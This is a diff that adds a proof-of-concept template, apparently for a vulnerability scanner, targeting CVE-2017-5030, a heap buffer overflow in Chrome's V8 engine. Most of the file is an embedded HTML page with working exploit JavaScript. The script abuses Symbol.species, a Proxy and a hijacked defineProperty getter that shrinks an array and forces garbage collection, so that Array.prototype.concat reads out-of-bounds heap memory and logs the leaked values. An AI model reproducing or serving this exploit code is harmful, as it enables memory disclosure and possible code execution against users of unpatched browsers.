@@ -1,0 +1,79 @@
+[info]
+author = "ave"
+description = "Google Chrome V8 引擎处理复杂 species 概念时存在堆缓冲区溢出漏洞，可通过构造的 HTML 页面触发任意代码执行"
+id = "POC-AVE-2017-0700"
+name = "CVE-2017-5030 PoC"
+severity = "high"
+tags = ["ave-2017-0700"]
+vuln_id = [
+    "CVE-2017-5030",
+    "AVE-2017-0700",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CVE-2017-5030 PoC</title>
+</head>
+<body>
+    <h1>CVE-2017-5030 V8 Heap Buffer Overflow PoC</h1>
+    <p>Check browser console for leaked memory values.</p>
+    <script>
+        var p = new Proxy([], {});
+        var b_dp = Object.prototype.defineProperty;
+        class MyArray extends Array {
+            static get [Symbol.species]() {
+                return function() { return p; }
+            };
+        }
+        var w = new MyArray(100);
+        w[1] = 0.1;
+        w[2] = 0.1;
+        function gc() {
+            for (var i = 0; i < 0x100000; ++i) {
+                var a = new String();
+            }
+        }
+        function evil_callback() {
+            w.length = 1;
+            gc();
+            return b_dp;
+        }
+        Object.prototype.__defineGetter__("defineProperty", evil_callback);
+        var c = Array.prototype.concat.call(w);
+        for (var i = 0; i < 20; i++) {
+            console.log("Leaked value[" + i + "]: " + c[i]);
+        }
+    </script>
+</body>
+</html>
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/html"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "CVE-2017-5030",
+    "Leaked value",
+]
